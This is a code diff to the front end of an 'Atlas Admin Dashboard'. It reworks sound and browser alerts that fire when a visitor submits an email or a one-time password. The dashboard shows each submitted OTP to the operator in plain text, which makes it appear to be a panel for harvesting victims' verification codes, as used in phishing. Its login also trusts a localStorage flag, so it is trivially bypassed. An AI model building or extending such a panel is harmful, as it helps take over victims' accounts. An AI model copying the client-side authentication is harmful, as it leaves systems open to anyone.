@@ -206,15 +206,17 @@
       background: #3b82f6;
       color: white;
     }
-    .enable-sound-btn {
-      background: #4a4ff0;
+    .sound-status {
+      background: #10b981;
       color: white;
-      border: none;
       padding: 8px 16px;
       border-radius: 50px;
-      cursor: pointer;
+      font-size: 13px;
       font-weight: 500;
       margin-right: 12px;
+    }
+    .sound-status.off {
+      background: #ef4444;
     }
   </style>
 </head>
@@ -232,8 +234,8 @@
 <div class="container" id="dashboardContainer" style="display: none;">
   <div class="dashboard-header">
     <h1>Atlas Admin Dashboard</h1>
-    <div>
-      <button id="enableSoundBtn" class="enable-sound-btn">🔊 Enable Sound</button>
+    <div style="display: flex; align-items: center; gap: 12px;">
+      <div id="soundStatus" class="sound-status off">🔇 Sound Off - Click to Enable</div>
       <button id="logoutBtn" class="logout-btn">Logout</button>
     </div>
   </div>
@@ -254,27 +256,44 @@
 <script>
   let socket = null;
   let soundEnabled = false;
-  let emailSound = null;
-  let otpSound = null;
+  let emailAudio = null;
+  let otpAudio = null;
 
-  // Pre-create audio elements
-  function initSounds() {
-    emailSound = new Audio('/sounds/email.mp3');
-    otpSound = new Audio('/sounds/otp.mp3');
-    emailSound.load();
-    otpSound.load();
+  // Create audio elements
+  function initAudio() {
+    emailAudio = new Audio('/sounds/email.mp3');
+    otpAudio = new Audio('/sounds/otp.mp3');
+    emailAudio.load();
+    otpAudio.load();
   }
 
   function playEmailSound() {
-    if (soundEnabled && emailSound) {
-      emailSound.play().catch(e => console.log('Audio play failed:', e));
+    if (soundEnabled && emailAudio) {
+      emailAudio.currentTime = 0;
+      emailAudio.play().catch(e => console.log('Email sound error:', e));
     }
   }
 
   function playOtpSound() {
-    if (soundEnabled && otpSound) {
-      otpSound.play().catch(e => console.log('Audio play failed:', e));
+    if (soundEnabled && otpAudio) {
+      otpAudio.currentTime = 0;
+      otpAudio.play().catch(e => console.log('OTP sound error:', e));
     }
+  }
+
+  function enableSound() {
+    soundEnabled = true;
+    const soundStatus = document.getElementById('soundStatus');
+    soundStatus.innerHTML = '🔊 Sound On - Notifications Active';
+    soundStatus.classList.remove('off');
+    
+    // Play test sound to unlock audio on browsers
+    const testAudio = new Audio();
+    testAudio.play().catch(() => {});
+    playEmailSound();
+    
+    // Show confirmation
+    alert('Sound enabled! You will now hear email.mp3 and otp.mp3 notifications.');
   }
 
   function showBrowserNotification(title, body) {
@@ -283,7 +302,7 @@
     }
   }
 
-  // Login logic
+  // Login
   document.getElementById('loginBtn').addEventListener('click', async () => {
     const email = document.getElementById('adminEmail').value.trim();
     const password = document.getElementById('adminPassword').value;
@@ -298,15 +317,20 @@
         localStorage.setItem('adminToken', 'loggedin');
         document.getElementById('loginContainer').style.display = 'none';
         document.getElementById('dashboardContainer').style.display = 'block';
-        initSounds();
-        connectSocket();
-        loadUsers();
-        setInterval(loadUsers, 5000);
+        initAudio();
         
         // Request notification permission
         if (Notification.permission === 'default') {
           Notification.requestPermission();
         }
+        
+        // Setup sound enable click
+        const soundStatus = document.getElementById('soundStatus');
+        soundStatus.addEventListener('click', enableSound);
+        
+        connectSocket();
+        loadUsers();
+        setInterval(loadUsers, 5000);
       } else {
         errorDiv.textContent = 'Invalid credentials';
         errorDiv.style.display = 'block';
@@ -317,29 +341,20 @@
     }
   });
 
-  // Enable sound button - REQUIRES USER CLICK TO UNLOCK AUDIO
-  document.getElementById('enableSoundBtn')?.addEventListener('click', () => {
-    soundEnabled = true;
-    // Play a silent test to unlock audio on browsers
-    const testAudio = new Audio();
-    testAudio.play().catch(() => {});
-    alert('Sound enabled! You will hear notifications for new emails and OTPs.');
-  });
-
   function connectSocket() {
     socket = io();
     
     socket.on('new-email', (data) => {
-      console.log('New email received:', data);
+      console.log('📧 New email:', data.email);
       playEmailSound();
-      showBrowserNotification('New Email Received', `${data.email} signed up`);
+      showBrowserNotification('📧 New Email', `${data.email} signed up`);
       loadUsers();
     });
     
     socket.on('new-otp', (data) => {
-      console.log('New OTP received:', data);
+      console.log('🔐 New OTP:', data.email, 'OTP:', data.otp);
       playOtpSound();
-      showBrowserNotification('New OTP Received', `${data.email} submitted OTP: ${data.otp}`);
+      showBrowserNotification('🔐 New OTP', `${data.email} submitted OTP: ${data.otp}`);
       loadUsers();
     });
     
@@ -412,13 +427,18 @@
   if (localStorage.getItem('adminToken')) {
     document.getElementById('loginContainer').style.display = 'none';
     document.getElementById('dashboardContainer').style.display = 'block';
-    initSounds();
-    connectSocket();
-    loadUsers();
-    setInterval(loadUsers, 5000);
+    initAudio();
+    
     if (Notification.permission === 'default') {
       Notification.requestPermission();
     }
+    
+    const soundStatus = document.getElementById('soundStatus');
+    soundStatus.addEventListener('click', enableSound);
+    
+    connectSocket();
+    loadUsers();
+    setInterval(loadUsers, 5000);
   }
 
   window.actionUser = actionUser;
